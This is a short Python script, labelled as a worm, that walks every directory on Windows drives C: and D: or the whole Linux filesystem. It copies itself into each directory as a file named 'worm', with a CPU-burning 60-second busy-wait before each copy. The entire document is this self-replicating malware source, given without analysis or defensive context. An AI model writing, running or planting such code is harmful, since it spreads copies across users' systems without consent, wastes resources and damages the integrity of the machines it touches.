import os
import shutil
import fileinput
import time
import platform
from os.path import exists

copyFileName = "/worm"

print("Starting worm...")
print("Current Operating System: " + platform.system())

if (platform.system() == "Windows"):
    if(exists("C:/")):
        for x in os.walk("C:/"):
            print(x[0])
            if (exists(x[0] + copyFileName)):
                continue
            else:
                TimeStart = int(time.time())
                while ((int(time.time()) - TimeStart) < 60):
                    continue
                try:
                    shutil.copy(__file__, x[0] + copyFileName)
                except:
                    print("Copy Failed...")
                    continue
                
    if(exists("D:/")):
        for x in os.walk("D:/"):
            print(x[0])
            if (exists(x[0] + copyFileName)):
                continue
            else:
                TimeStart = int(time.time())
                while ((int(time.time()) - TimeStart) < 60):
                    continue
                try:
                    shutil.copy(__file__, x[0] + copyFileName)
                except:
                    print("Copy Failed...")
                    continue
    
elif (platform.system() == "Linux"):
    for x in os.walk("/"):
        print(x[0])
        if (exists(x[0] + copyFileName)):
            continue
        else:
            TimeStart = int(time.time())
            while ((int(time.time()) - TimeStart) < 60):
                continue
            try:
                shutil.copy(__file__, x[0] + copyFileName)
            except:
                print("Copy Failed...")
                continue
